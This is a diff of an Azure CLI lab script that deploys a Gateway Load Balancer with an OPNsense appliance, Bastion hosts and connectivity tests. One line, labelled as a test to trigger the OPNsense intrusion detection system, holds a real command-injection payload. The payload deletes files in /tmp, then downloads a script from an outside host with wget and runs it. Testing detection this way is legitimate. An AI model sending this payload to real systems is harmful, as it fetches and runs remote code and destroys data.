@@ -9,15 +9,14 @@ az account list --query "[?isDefault == \`true\`].{Name:name, IsDefault:isDefaul
 # You can provision both Consumer and Provider in the same Subscription
 # In case you want to do it separated Subscription change your active subscription as shown
 az account set --subscription VSE-SUB  #My personal MSDN Subscription
-az account set --subscription DMAUSER-MS #My Microsoft Internal Subscription
 
 ### Consumer ###
 # Define variables based on your requirements
-consumer_rg=gwlb-lab2
+consumer_rg=glb-lab
 consumer_location=centralus
-consumervnetcidr="10.100.0.0/24"
-consumersubnet="10.100.0.0/27"
-consumerbastionsubnet="10.100.0.32/27"
+consumervnetcidr="10.0.0.0/24"
+consumersubnet="10.0.0.0/27"
+consumerbastionsubnet="10.0.0.32/27"
 mypip=$(curl -4 ifconfig.io -s) # or replace with your home public ip, example mypip="1.1.1.1" (required for Cloud Shell deployments)
 echo "Type username and password"
 read -p 'Username: ' username && read -sp 'Password: ' password 
@@ -26,7 +25,7 @@ read -p 'Username: ' username && read -sp 'Password: ' password
 az group create --name $consumer_rg --location $consumer_location --output none
 az network vnet create --resource-group $consumer_rg --name consumer-vnet --location $consumer_location --address-prefixes $consumervnetcidr --subnet-name vmsubnet --subnet-prefix $consumersubnet --output none
 
-# 2) #(Optional) UDR to restrict SSH access to Azure VMs from your Public IP only:
+# 2) UDR to restrict SSH access to Azure VMs from your Public IP only:
 az network nsg create --resource-group $consumer_rg --name consumer-nsg --location $consumer_location
 az network nsg rule create \
     --resource-group $consumer_rg \
@@ -72,10 +71,10 @@ az vm create -n consumer-vm -g $consumer_rg --image UbuntuLTS --size Standard_B1
 az network nic ip-config address-pool add --address-pool vmbackend --ip-config-name ipconfig1 --nic-name consumer-vm-nic --resource-group $consumer_rg --lb-name consumer-elb --output none
 az network nic ip-config inbound-nat-rule add --inbound-nat-rule sshnat --ip-config-name ipconfig1 --nic-name consumer-vm-nic --resource-group $consumer_rg --lb-name consumer-elb --output none
 
-# 6) Install nginx and test website (Move this to cloud.ini)
+# 6) Install nginx and test website (Move this to cloud.init)
 az vm extension set --resource-group $consumer_rg --vm-name consumer-vm --name CustomScript --settings '{"commandToExecute": "apt-get -y update && apt-get -y install nginx && echo Test Website on consumer-vm > /var/www/html/index.html"}' --publisher Microsoft.Azure.Extensions --no-wait
 
-# 7) Deploy Bastion
+# 7) Deploy Bastion (Optional)
 az network vnet subnet create --resource-group $consumer_rg --name AzureBastionSubnet --vnet-name consumer-vnet --address-prefixes $consumerbastionsubnet --output none
 az network public-ip create --resource-group $consumer_rg --name consumer-bastion-pip --sku Standard --location $consumer_location
 az network bastion create --name consumer-bastion --sku basic  --public-ip-address consumer-bastion-pip --resource-group $consumer_rg --vnet-name consumer-vnet --location $consumer_location
@@ -95,7 +94,7 @@ az account set --subscription VSE-SUB  #My personal MSDN Subscription
 az account set --subscription DMAUSER-MS #My Microsoft Internal Subscription
 
 #Variables - Make changes based on your needs.
-provider_rg=glb-lab5
+provider_rg=glb-lab
 provider_location=centralus
 providervnetcidr="10.0.0.0/24"
 providerexternalcidr="10.0.0.0/27"
@@ -125,66 +124,49 @@ az network vnet subnet create --resource-group $provider_rg --name AzureBastionS
 az network public-ip create --resource-group $provider_rg --name provider-bastion-pip --sku Standard --location $provider_location --output none
 az network bastion create --name provider-bastion --sku basic  --public-ip-address provider-bastion-pip --resource-group $provider_rg --vnet-name provider-vnet --location $provider_location
 
-# Attach LB to GW (different subscriptions - Portal only works for the same subscription)
-# Check current sub
-az account list --query "[?isDefault == \`true\`].{Name:name, IsDefault:isDefault}" -o table
-# Subscription where Consumer is.
-az account set --subscription MSDN_Dmauser  #MSDN ---> Change to your subscription name
-feid=$(az network lb frontend-ip show -g $provider_rg --lb-name provider-nva-glb --name FW --query id --output tsv)
-echo $feid
 
-# Sub where Provider is:
-# Add GLB chain
-az account set --subscription DMAUSER-MS #Microsoft ---> Change to your subscription name
-az network lb frontend-ip update -g $consumer_rg --name frontendip1 --lb-name consumer-elb --public-ip-address PublicIPconsumer-elb --gateway-lb $feid --output none
+# Chain Consumer ELB to Provider-GW (different subscriptions - Portal only works for the same subscription)
+# Subscription where Consumer is (required only if consumer is on different subscription)
+az account set --subscription <consumer subscription>  # Change to your subscription name
+# Add chain between consumer-elb and provider-nva-glb
+az network lb frontend-ip update -g $consumer_rg --name frontendip1 --lb-name consumer-elb --public-ip-address PublicIPconsumer-elb --gateway-lb $glbfeid --output none
 
-# Validate GLB chain
-az account set --subscription DMAUSER-MS #Microsoft ---> Change to your subscription name
+# Validate chain between consumer-elb and provider-nva-glb
 az network lb frontend-ip show -g $consumer_rg --name frontendip1 --lb-name consumer-elb --query gatewayLoadBalancer.id -o tsv
+# In case you see a resource ID it there's a chain between consumer-elb and provider-nva-glb.
+# Otherwise, empty output means there's no chain.
 
-#Remove GLB chain
-az account set --subscription DMAUSER-MS #Microsoft ---> Change to your subscription name
-az network lb frontend-ip update -g $consumer_rg --name frontendip1 --lb-name consumer-elb --public-ip-address PublicIPconsumer-elb --gateway-lb ""
-
-
-#### Troubleshooting/Advanced validations
-#Check traffic VxLAN traffic OPNSense after chaining with LB
-tcpdump -n -i hn1 host 10.0.0.36
-
-### Network Capture OPNSense
-#Inbound (External Interface)
-tcpdump -n -i vxlan0
-#Outbound (External Interface)
-tcpdump -n -i vxlan1 
-
-# Vulnerability Test (Enable IDS on OPNsense)
-curl http://40.77.94.253/shell?cd+/tmp;rm+-rf+*;wget+net.joostjansen.ml/jaws;sh+/tmp/jaws
+# Remove chain between consumer-elb and provider-nva-glb
+az network lb frontend-ip update -g $consumer_rg --name frontendip1 --lb-name consumer-elb --public-ip-address PublicIPconsumer-elb --gateway-lb "" --output none
 
 # Connectivity Checks / Replace the Public IP listed below with your LB.
 # Get you LB Public IP:
-az account set --subscription DMAUSER-MS #Microsoft
+# Subscription where Consumer is (required only if consumer is on different subscription)
+az account set --subscription <consumer subscription>  # Change to your subscription name
+
+# Get consumer-elb public ip as variable.
 consumerelbpip=$(az network public-ip show -g $consumer_rg --name PublicIPconsumer-elb --query ipAddress -o tsv)
-
-
+echo $consumerelbpip
 ## Port 50000 - NAT Rule to 22 Consumer-VM Backend
 
 # Use the output below to run your connectivity tests. 
 #Tests on Windows 
-echo psping -t $consumerelbpip 
+echo psping -t $consumerelbpip:80 
 echo psping -t $consumerelbpip:50000
-echo psping -t $consumerelbpip:50000
+# Run output on windows command line.
 
-
-# Use Linux (requires install packages)
-sudo hping3 40.77.94.253 -S -p 50000
-sudo nping --tcp 40.77.94.253 -p 80 -c 50000
+# Use Linux (it requires nmap and hping3 packages)
+sudo hping3 $consumerelbpip -S -p 50000
+sudo nping --tcp $consumerelbpip -p 80 -c 50000
+nc -v -z $consumerelbpip 80
+# output: Connection to 40.113.192.215 80 port [tcp/http] succeeded!
+curl $consumerelbpip
+# output: Test Website on consumer-vm
 
 # Port 80 - LB Rule HTTP
 psping -t 40.77.94.253:80
 sudo hping3 40.77.94.253 -S -p 80
 sudo nping --tcp 40.77.94.253 -p 80 -c 1000
-nc -v -z 40.77.94.253 80
-curl 40.77.94.253
 
 # Test Consumer-VM Oubound Traffic via GLB
 ssh dmauser@40.77.94.253 -p 50000 
@@ -212,32 +194,25 @@ az network bastion create --name consumer-bastion --sku basic  --public-ip-addre
 # Wait about 5 minutes to complete Bastion deployment.
 
 
-#Troubleshooting
-# Compare settings  Internal/External Port/ID and your load balancer.
+# Clean up lab
+# Set variables
+$consumer_rg=
+$consumer_location=
+$provider_rg=
+$provider_location=
+az 
 
-ifconfig bridge0 destroy
-ifconfig vxlan0 destroy
-ifconfig vxlan1 destroy
+#### Troubleshooting/Advanced validations
+#Check traffic VxLAN traffic OPNSense after chaining with LB
+tcpdump -n -i hn1 host 10.0.0.36
 
-ifconfig vxlan2 destroy
+### Network Capture OPNSense
+#Inbound (External Interface)
+tcpdump -n -i vxlan0
+#Outbound (External Interface)
+tcpdump -n -i vxlan1 
 
-setenv gwlbip 10.0.0.36
-setenv extid 901
-setenv extport 10801
-setenv intid 900
-setenv intport 10800
-setenv opnlanip 10.0.0.37
+# Vulnerability Test (Enable IDS on OPNsense)
+curl http://40.77.94.253/shell?cd+/tmp;rm+-rf+*;wget+net.joostjansen.ml/jaws;sh+/tmp/jaws
 
-ifconfig hn0 mtu 4000
-ifconfig hn1 mtu 4000
 
-ifconfig vxlan create vxlanid $extid vxlanlocal $opnlanip vxlanlocalport $extport vxlanremote $gwlbip vxlanremoteport $extport
-ifconfig vxlan create vxlanid $intid vxlanlocal $opnlanip vxlanlocalport $intport vxlanremote $gwlbip vxlanremoteport $intport
-
-ifconfig bridge0 create
-ifconfig bridge0 addm vxlan0
-ifconfig bridge0 addm vxlan1
-
-ifconfig vxlan0 up
-ifconfig vxlan1 up
-ifconfig bridge0 up
